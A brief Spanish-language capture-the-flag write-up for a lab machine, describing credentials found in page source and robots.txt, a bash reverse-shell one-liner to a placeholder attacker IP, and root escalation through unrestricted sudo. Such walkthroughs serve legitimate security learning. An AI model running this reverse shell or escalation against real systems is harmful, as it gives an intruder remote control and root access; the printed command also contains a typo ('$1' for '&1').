# Picke morty

Esta maquina tenia las credenciales de usuario en el codigo fuente de la aplicación (se podia ver en el codigo fuente con contro + u)

por otro lado haciendo fuzzing con http-enum de nmap sobre el puerto 80 descubrías el robots.txt donde estaba la contraseña del usuario

y te deba una consola totalmente interactiva con la cual con el comando

```
bash -i >& /dev/tcp/<ip atacante>/puerto 0>$1
```

y poniendonos en escucha por ese mismo puerto ganariamos acceso a la maquina

## escalada de privilegio

muy sencilla por que simplemente el propietario de la aplicacion podria correr cualquier comando con sudo y simplemente haciendo sudo bash -p nos daba una terminal interactiva con root y podiamos leer todas las credenciales
